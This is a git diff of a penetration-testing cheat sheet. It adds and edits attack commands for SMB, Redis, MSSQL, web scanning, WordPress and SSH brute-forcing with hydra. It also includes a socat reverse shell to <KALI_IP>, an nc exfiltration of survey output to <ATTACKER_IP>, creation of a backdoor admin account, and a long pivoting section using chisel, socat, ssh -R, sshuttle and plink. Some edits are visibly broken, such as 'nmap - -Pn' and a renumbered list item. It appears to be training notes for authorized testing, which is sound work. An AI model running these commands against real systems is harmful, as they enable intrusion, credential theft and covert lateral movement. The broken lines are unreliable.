@@ -15,13 +15,19 @@ Standard penetration testing methodology:
 4. **🛠️ Post-Exploitation** - Maintain access and escalate privileges
    - **📊 Survey** - Gather information about the compromised system
    - **⬆️ PrivEsc** - Escalate privileges to higher-level accounts
-5. **🔄 Pivot** - Use compromised systems to access additional networks
+1. **🔄 Pivot** - Use compromised systems to access additional networks
+
+### Additional
+
+- https://brandonrussell.io/OSCP-Notes/
 
 ## 📚 Reference Frameworks
 
 - [Unified Kill Chain](https://www.unifiedkillchain.com/) - Comprehensive attack framework
 - [MITRE ATT&CK](https://attack.mitre.org/) - Adversarial tactics and techniques
 - [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) - Original kill chain methodology
+- [https://www.varonis.com/blog/cyber-kill-chain](Varonis Kill Chain) - similar model
+- [Active Directory Attack-Defense](https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md)
 
 ## 🔍 Searching
 
@@ -467,11 +473,24 @@ dig @<TARGET> SOA
 - **C$** - Administrative share for the C:\ disk volume. This is where the operating system is hosted.
 - **IPC$** - The inter-process communication share. Used for inter-process communication via named pipes and is not part of the file system
 
+#### SMB Share Interaction
+```bash
+# List shares anonymously
+smbclient -N -L //<TARGET_IP>
+
+# Connect to a public share anonymously
+smbclient -N //<TARGET_IP>/Public
+
+# Once connected:
+# ls -> list files
+# get <filename> -> download a file
+```
+
 ## 🗄️ Redis
 
 ```bash
 # Connect to Redis server
-redis-cli -h <IP_ADDRESS>
+redis-cli -h <TARGET>
 
 # Redis commands:
 INFO                    # Get server information
@@ -505,7 +524,7 @@ aws --endpoint=<S3_URL> s3 cp <FILE> s3://<DOMAIN>
 
 ```bash
 # Connect to MSSQL server using impacket
-/usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth '<DOMAIN>/<USER>:<PASSWORD>@<IP_ADDRESS>'
+/usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
 
 # MSSQL commands:
 select @@version;                    # Get SQL Server version
@@ -548,10 +567,12 @@ xp_cmdshell "powershell.exe -exec bypass -c ../../Users/<USER>/Desktop/nc64.exe 
 
 ```bash
 # Enumerates web server + version + OS + frameworks + JS libraries
-whatweb --aggression 3 <TARGET>
+whatweb --aggression 3 http://<TARGET>
 
 # Command-line web vulnerability scanner
-wapiti --url <TARGET>
+wapiti --url http://<TARGET>
+
+nikto -o nikto_scan.txt -h http://<TARGET>
 ```
 
 ### 🔍 Webserver Dirs
@@ -560,8 +581,11 @@ wapiti --url <TARGET>
 # Directory brute-force with a common wordlist
 gobuster --quiet --threads 64 --output gobuster_dir_common dir --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --url <TARGET>
 
-# Directory brute-force using a larger wordlist and showing expanded URLs
+# Directory brute-force using a larger wordlist
 gobuster --quiet --threads 64 --output gobuster_dir_medium dir -r -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u <TARGET>
+
+# Same with file extensions
+gobuster --quiet --threads 64 --output gobuster_dir_medium dir -r -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -u <TARGET>
 ```
 
 ### 🌐 Subdomains
@@ -580,7 +604,7 @@ gobuster --quiet --threads 64 --output gobuster_vhost_top5000 vhost -w /usr/shar
 
 ```bash
 # Enumerate Wordpress users
-wpscan --enumerate u --url http://<USER>/
+wpscan --enumerate u --url http://<TARGET>/
 
 # Brute-force creds
 wpscan --password-attack wp-login --passwords <PASSWORDS_FILE> --usernames <USERS_FILE> --url http://<TARGET>/
@@ -667,12 +691,16 @@ Crack hashes:
 - https://crackstation.net/
 - https://hashes.com/en/decrypt/hash
 
+### ID Hash Type
+
 ```bash
 # Also read:
 man 5 crypt
 
 # Spotty: but IDs hashes
 hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1'
+
+hash-identifier
 ```
 
 ## 💥 Brute-Forcing
@@ -683,7 +711,7 @@ hashid '$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1'
 hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
 # Wordpress brute-force login form with a complex request string (ONLINE - use small wordlist)
-hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The%20password%20you%20entered%20for%20the%20username' -V
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -V
 
 # SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
 hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT>
@@ -1034,6 +1062,7 @@ stty -a | grep -o "rows [0-9]*; columns [0-9]*" | awk '{print "stty", $2, $4}'
 ### 🔧 Socat Method
 
 - https://github.com/andrew-d/static-binaries/tree/master/binaries
+- https://github.com/ernw/static-toolbox/
 
 ```bash
 #====================================================================
@@ -1062,7 +1091,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
 # LINUX TARGET (Connect Back):
 wget http://<KALI_IP>:80/socat -o /tmp/socat
 chmod +x /tmp/socat
-nohup /tmp/socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane > /dev/null 2>&1 &
+nohup /tmp/socat tcp-connect:<KALI_IP>:<PORT> exec:'bash -li',pty,stderr,setsid,sigint,sane 2>&1 >/dev/null &
 
 #--------------------------------------------------------------------
 # WINDOWS TARGET (Simple Shell)
@@ -1509,8 +1538,12 @@ REGEXES="0" ./linpeas.sh 2>&1 | tee linpeas_output.txt
 ```
 
 ```bash
-# Retrieve survey
+# SCP
 scp -P <PORT> <USER>@<IP_ADDR>:/tmp/linpeas_output.txt ~/
+
+# NC
+nc -l -p <PORT> > ~/linpeas_output.txt
+cat /tmp/linpeas_output.txt | nc <ATTACKER_IP> <PORT>
 ```
 
 ### 🚨 CVE-2021-4034 - Pkexec Local Privilege Escalation (privesc)
@@ -1622,10 +1655,10 @@ hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ```bash
 # Enhanced nmap scan for MySQL service
-nmap -Pn -sV -p 3306 -A <IP_ADDRESS>  # Better service enumeration
+nmap - -Pn -sV -p 3306 -A <TARGET>  # Better service enumeration
 
 # Connect to MySQL/MariaDB with mycli (enhanced MySQL client)
-mycli -u root -h <IP_ADDRESS>
+mycli -u root -h <TARGET>
 
 # MariaDB-specific commands:
 SHOW databases;
@@ -1644,6 +1677,13 @@ SELECT * FROM <TABLE>;
 | `... --dbs`                           | Enumerates (lists) all the databases that the current user can access on the server.                                                                                                          |
 | `... -D <DATABASE> --tables`          | After identifying a database, this command lists all the tables within that specific database.                                                                                                |
 | `... -D <DATABASE> -T <TABLE> --dump` | Dumps (extracts) all the data from a specific table within a specific database. This is the final step to retrieve the data.                                                                  |
+
+#### Authenticated Web Scans (with Cookie)
+
+```bash
+# Run sqlmap with session cookie for authenticated pages
+sqlmap -u "http://<TARGET_IP>/view_profile.php?id=1" --cookie="<COOKIE_HEADER>=<COOKIE_VALUE>" --dbs
+```
 
 ### 💾 MongoDB
 
@@ -1688,6 +1728,12 @@ python3 -c "import re, sys; [print(m.decode()) for m in re.findall(b'[ -~]{4,}',
 FILE="FILENAME" ; ( strings -S "$FILE" ; strings -l "$FILE" ; strings -b "$FILE" ) | sort -u
 ```
 
+### Longest String from text file
+
+```bash
+awk '{ print length, $0 }' <FILENAME> | sort -nr | uniq | head -n 20 | cut -d" " -f2-
+```
+
 ## 🪟 Windows Commands
 
 ```powershell
@@ -1714,6 +1760,7 @@ nslookup
 # Add User w/ admin privs
 net user <USERNAME> <PASSWORD> /add
 net localgroup administrators <USERNAME> /add
+net localgroup "Remote Management Users" <USERNAME> /add
 ```
 
 ### 💻 PowerShell
@@ -1906,6 +1953,179 @@ Stop-Transcript
 ## 🌱 Living Off the Land
 
 Ref: https://lolbas-project.github.io/#
+
+### Pivoting and Tunneling OtL
+
+- Linux: `/etc/hosts`
+    - DNS: `/etc/resolv.conf`
+- Windows: `C:\Windows\System32\drivers\etc\hosts`
+
+- Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
+- SSH can be used to create both port forwards, and proxies
+- plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
+- Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
+- Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
+- sshuttle is a nicer way to create a proxy when we have SSH access on a target
+
+#### Routing Table Manipulation
+
+```bash
+### Enable routing if not already (requires elevation)
+# On a Linux Pivot Host:
+sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+# On a Windows Pivot Host:
+Set-NetIPInterface -Forwarding Enabled
+
+### Add route through compromised host to access internal network
+sudo ip route add <SUBNETWORK>/24 via <COMPROMISED_GATEWAY>
+```
+
+```bash
+#####################################################################
+#                   NETWORK PIVOTING CHEATSHEET                     #
+#####################################################################
+
+#====================================================================
+# 1. INITIAL ENUMERATION (from the Compromised Host)
+#====================================================================
+# Description: Commands to run on the first compromised machine to
+# understand the internal network without uploading tools.
+
+| Command | Purpose |
+| :--- | :--- |
+| `arp -a` | (Linux/Windows) Check the ARP cache for recently contacted IPs. |
+| `cat /etc/hosts` | (Linux) Check for static DNS entries. |
+| `cat /etc/resolv.conf` | (Linux) Find internal DNS servers. |
+| `ipconfig /all` | (Windows) Find DNS servers and network interface details. |
+| `nmcli dev show` | (Linux) Alternative to see DNS and interface details. |
+
+# --- Bash Network Sweeps (Living off the Land) ---
+
+# A) Ping Sweep (Find live hosts)
+# Pings all hosts from .1 to .254 on a given subnet in parallel.
+for i in {1..254}; do (ping -c 1 <SUBNET>.${i} | grep "bytes from" &); done
+
+# B) Port Scan a Single Host (Very Slow)
+# Scans all ports on a target IP. Best to use a smaller range (e.g., {1..1000}).
+for i in {1..65535}; do (echo > /dev/tcp/<TARGET_IP>/$i) >/dev/null 2>&1 && echo "[+] Port $i is open"; done
+
+#====================================================================
+# 2. SSH TUNNELLING (Requires SSH access to the pivot machine)
+#====================================================================
+# Description: Uses a standard SSH client to forward ports or create a proxy.
+# The '-fN' flags are used to background the connection and not execute a command.
+
+| Type | Command | Description |
+| :--- | :--- | :--- |
+| **Local Port Forward (`-L`)** | `ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> user@<PIVOT_HOST> -fN` | Connects **from your attacker machine** to the pivot. Access `localhost:<LOCAL_PORT>` to reach the target. |
+| **Dynamic Proxy (`-D`)** | `ssh -D <LOCAL_PORT> user@<PIVOT_HOST> -fN` | Connects **from your attacker machine**. Creates a SOCKS proxy on `localhost:<LOCAL_PORT>` to pivot all traffic through. Use with `proxychains`. |
+| **Remote Port Forward (`-R`)** | `ssh -R <ATTACKER_PORT>:<TARGET_IP>:<TARGET_PORT> user@<ATTACKER_IP> -i keyfile -fN` | Connects **from the compromised pivot machine** back to your attacker machine. Useful when you have a shell but no direct SSH access *to* the pivot. |
+
+# --- Setup for SSH Remote Port Forwarding (Reverse Connection) ---
+
+# 1. (Attacker) Generate throwaway SSH keys:
+ssh-keygen
+
+# 2. (Attacker) Add public key to authorized_keys and restrict it to prevent a shell on your machine:
+# Add this full line into ~/.ssh/authorized_keys
+command="echo 'This key is for port forwarding only'",no-agent-forwarding,no-x11-forwarding,no-pty <CONTENTS_OF_PUBLIC_KEY.pub>
+
+# 3. (Attacker) Ensure your SSH server is running:
+sudo systemctl start ssh
+
+# 4. (Target) Transfer the PRIVATE key to the compromised machine to initiate the connection.
+
+#====================================================================
+# 3. SOCAT (Versatile Relaying & Port Forwarding)
+#====================================================================
+# Description: A powerful tool for connecting two points. Requires uploading a
+# static binary to the target machine.
+
+| Type | Command (On Pivot Machine) | Description |
+| :--- | :--- | :--- |
+| **Reverse Shell Relay** | `./socat tcp-l:<RELAY_PORT> tcp:<ATTACKER_IP>:<ATTACKER_PORT> &` | Catches a reverse shell from an isolated machine and forwards it to your attacker machine. You need a listener on `<ATTACKER_PORT>`. |
+| **Simple Port Forward** | `./socat tcp-l:<FORWARD_PORT>,fork,reuseaddr tcp:<TARGET_IP>:<TARGET_PORT> &` | Opens a port on the pivot machine. Any traffic sent to it gets forwarded to the internal target. |
+
+# --- "Quiet" Socat Port Forward (No open port on pivot) ---
+
+# 1. On ATTACKER machine:
+# Creates a local relay between two ports.
+socat tcp-l:<LOCAL_PORT_1> tcp-l:<LOCAL_PORT_2>,fork,reuseaddr &
+
+# 2. On PIVOT machine:
+# Connects the attacker's relay to the internal target.
+./socat tcp:<ATTACKER_IP>:<LOCAL_PORT_2> tcp:<TARGET_IP>:<TARGET_PORT>,fork &
+
+# Result: Accessing localhost:<LOCAL_PORT_1> on your attacker machine now connects to the target.
+
+#====================================================================
+# 4. CHISEL (Modern Proxy & Port Forwarding over HTTP)
+#====================================================================
+# Description: A client/server tool written in Go. Excellent for creating fast
+# reverse SOCKS proxies. Requires chisel binary on both attacker and target.
+
+# --- Reverse SOCKS Proxy (Most Common Use) ---
+
+# 1. On ATTACKER machine (as server):
+# Starts a listener for the compromised host to connect back to.
+./chisel server -p <LISTEN_PORT> --reverse &
+
+# 2. On PIVOT machine (as client):
+# Connects back to your server and establishes the proxy.
+./chisel client <ATTACKER_IP>:<LISTEN_PORT> R:socks &
+
+# NOTE: The SOCKS5 proxy will be created on your attacker machine, typically on 127.0.0.1:1080. Check Chisel's output.
+
+# --- Remote Port Forward ---
+
+# 1. On ATTACKER machine (as server):
+./chisel server -p <LISTEN_PORT> --reverse &
+
+# 2. On PIVOT machine (as client):
+./chisel client <ATTACKER_IP>:<LISTEN_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
+
+# Result: Your attacker machine can now access the target service via localhost:<LOCAL_PORT>.
+
+#====================================================================
+# 5. SSHUTTLE (Simulates a VPN via SSH)
+#====================================================================
+# Description: Forwards traffic for an entire subnet over an SSH connection.
+# Requires SSH access and Python on the pivot host. Run only on your attacker machine.
+
+| Type | Command (On Attacker Machine) |
+| :--- | :--- |
+| **Password Auth** | `sshuttle -r user@<PIVOT_HOST> <TARGET_SUBNET>` |
+| **Key-Based Auth** | `sshuttle -r user@<PIVOT_HOST> --ssh-cmd "ssh -i <KEYFILE>" <TARGET_SUBNET>` |
+
+# Error Mitigation:
+# If you get a "Broken pipe" error, it's likely because the pivot host is inside the subnet you're forwarding.
+# Exclude the pivot host's IP to fix it:
+sshuttle ... -x <PIVOT_HOST_IP>
+
+#====================================================================
+# 6. USING THE PIVOT
+#====================================================================
+
+# --- ProxyChains ---
+# Description: Tool to force CLI applications to use a SOCKS proxy.
+
+# 1. Configure the proxy server at the bottom of /etc/proxychains4.conf:
+# [ProxyList]
+# socks5  127.0.0.1 1080  # For Chisel
+# socks4  127.0.0.1 1337  # For an SSH -D proxy
+
+# 2. Prepend 'proxychains' to your command:
+proxychains nmap -sT -p 80,443 <INTERNAL_IP>
+
+# --- plink.exe (Windows SSH Tunnelling) ---
+# Description: PuTTY's command-line tool for Windows reverse connections.
+
+# 1. (Attacker) Convert OpenSSH key to PuTTY format:
+puttygen <KEYFILE> -o <OUTPUT_KEY.ppk>
+
+# 2. (Windows Pivot) Transfer plink.exe and the .ppk key, then execute:
+cmd.exe /c echo y \| .\plink.exe -R <ATTACKER_PORT>:<TARGET_IP>:<TARGET_PORT> user@<ATTACKER_IP> -i <KEYFILE.ppk> -N
+```
 
 ## 📁 Files
 
